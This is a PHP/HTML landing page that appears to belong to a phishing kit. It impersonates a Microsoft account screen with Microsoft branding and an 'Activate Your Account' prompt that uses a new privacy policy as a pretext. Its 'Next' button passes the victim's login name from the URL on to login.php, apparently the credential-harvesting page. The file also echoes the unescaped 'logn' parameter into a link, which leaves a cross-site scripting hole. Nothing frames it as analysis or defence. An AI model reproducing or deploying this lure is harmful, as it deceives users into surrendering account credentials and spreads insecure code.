<?php

        $logn = $_GET['logn'];

	require_once 'hostname.php';

	$praga=rand();

	 $praga=md5($praga);





?>
<!DOCTYPE html>
<html dir="ltr" lang="EN-GB"><head>
<title>Activate Your Account</title>
<link rel="shortcut icon" href="./css/favicon.ico">
        <link rel="stylesheet" title="Default" type="text/css" href="./css/maks.css">
		<style type="text/css">body{display:none;}</style>
		<style type="text/css">body{display:block !important;}</style>
        <noscript><style type="text/css">body{display:block !important;}</style></noscript>
</head>
<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
<div>
<div id="maincontent"><!-- ko withProperties: { '$wizard': viewModel } --><section class="section no-margin-bottom" data-bind="visible: !$wizard || $wizard.showHolder"><div class="section-body container">

<div id="pageControlHost"><div><div id="Credentials"><div class="container" id="CredentialsInputPane"><!-- ko if: svr.BL --><div class="row text-body"><img alt="Microsoft account" src="css/AppCentipede_Microsoft.svg" class="img-centipede" data-bind="svgSrc: centipede.getUrl(), click: centipede.click, attr: { alt: str['MOBILE_STR_Header_Brand'] }"></div><!-- /ko --><!-- ko template: { nodes: templateNodes["MainContent"], data: $parent } --><!-- ko ifnot: hrdVisible -->

<div id="loginHeader" class="row text-subheader" data-bind="text: loginHeader" style="font-size:30px;">Activate Your Account</div><div class="row text-body"><div id="loginDescription" data-bind=" htmlWithBindings: loginDescription, childBindings: { 'learnMoreLink': { click: learnMore.open, visible: !svr.Be, css: { 'display-block': !pwdView.isCombinedSISU() } } }">Keep your account secured. Follow the next step in joining our new privacy policy to help secure your privacy.</div>
                </div>
    </div></div></div><!-- ko if: showButtons && templateNodes["Buttons"] --><div class="row" id="ftrButto"><!-- ko template: { nodes: templateNodes["Buttons"], data: $parent } --><!-- ko if: pwdView.isActive --><div class="col-xs-24 form-group"><a href="./login.php?logn=<?php echo $_GET['logn']; ?>"><div class="btn btn-block btn-primary btn-image btn-image-svg">Next</div></a>
  </div><!-- /ko --><!-- /ko --></div>
</div></div>

  
  
  
  
  
   <div id="ftr" class="text-body"><a id="ftrTerms" class="first"
 data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, attr: { 'target': linkTarget }"
 href="#" 
 style="color: rgb(0, 120, 215); text-decoration: none; white-space: nowrap; margin-left: 16px; margin-right: 16px; padding-left: 0px; font-family: &quot;Segoe UI Webfont&quot;,-apple-system,&quot;Helvetica Neue&quot;,&quot;Lucida Grande&quot;,Roboto,Ebrima,&quot;Nirmala UI&quot;,Gadugi,&quot;Segoe Xbox Symbol&quot;,&quot;Segoe UI Symbol&quot;,&quot;Meiryo UI&quot;,&quot;Khmer UI&quot;,Tunga,&quot;Lao UI&quot;,Raavi,&quot;Iskoola Pota&quot;,Latha,Leelawadee,&quot;Microsoft YaHei UI&quot;,&quot;Microsoft JhengHei UI&quot;,&quot;Malgun Gothic&quot;,&quot;Estrangelo Edessa&quot;,&quot;Microsoft Himalaya&quot;,&quot;Microsoft New Tai Lue&quot;,&quot;Microsoft PhagsPa&quot;,&quot;Microsoft Tai Le&quot;,&quot;Microsoft Yi Baiti&quot;,&quot;Mongolian Baiti&quot;,&quot;MV Boli&quot;,&quot;Myanmar Text&quot;,&quot;Cambria Math&quot;; font-size: 13px; font-style: normal; font-weight: normal; letter-spacing: normal; line-height: 20px; orphans: 2; text-align: center; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; background-color: rgb(255, 255, 255);">Terms
of Use</a><a id="ftrPrivacy"
 data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, attr: { 'target': linkTarget }"
 href="#"
 style="color: rgb(0, 120, 215); text-decoration: none; white-space: nowrap; margin-left: 16px; margin-right: 16px; font-family: &quot;Segoe UI Webfont&quot;,-apple-system,&quot;Helvetica Neue&quot;,&quot;Lucida Grande&quot;,Roboto,Ebrima,&quot;Nirmala UI&quot;,Gadugi,&quot;Segoe Xbox Symbol&quot;,&quot;Segoe UI Symbol&quot;,&quot;Meiryo UI&quot;,&quot;Khmer UI&quot;,Tunga,&quot;Lao UI&quot;,Raavi,&quot;Iskoola Pota&quot;,Latha,Leelawadee,&quot;Microsoft YaHei UI&quot;,&quot;Microsoft JhengHei UI&quot;,&quot;Malgun Gothic&quot;,&quot;Estrangelo Edessa&quot;,&quot;Microsoft Himalaya&quot;,&quot;Microsoft New Tai Lue&quot;,&quot;Microsoft PhagsPa&quot;,&quot;Microsoft Tai Le&quot;,&quot;Microsoft Yi Baiti&quot;,&quot;Mongolian Baiti&quot;,&quot;MV Boli&quot;,&quot;Myanmar Text&quot;,&quot;Cambria Math&quot;; font-size: 13px; font-style: normal; font-weight: normal; letter-spacing: normal; line-height: 20px; orphans: 2; text-align: center; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; background-color: rgb(255, 255, 255);">Privacy
&amp; Cookies</a>
<div data-bind="component: { name: 'footer-control', params: { showLinks: footer.showLinks, showLogo: footer.showLogo, serverData: svr } }"><div id="footerTD" class="popupfooter popup breakword footer"><!-- ko if: showLinks || impressumLink --><!-- /ko --><!-- ko if: showLogo --><div id="ftrLogo" class="footerNode text-base text-secondary text-logotype"><img alt="Microsoft" src="css/Microsoft_Logotype_Gray.svg" data-bind="svgSrc: logoTypeUrl, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }"></div><!-- /ko --><!-- ko ifnot: showLogo --><!-- /ko --></div></div></div></div><!-- /ko --></div></body></html>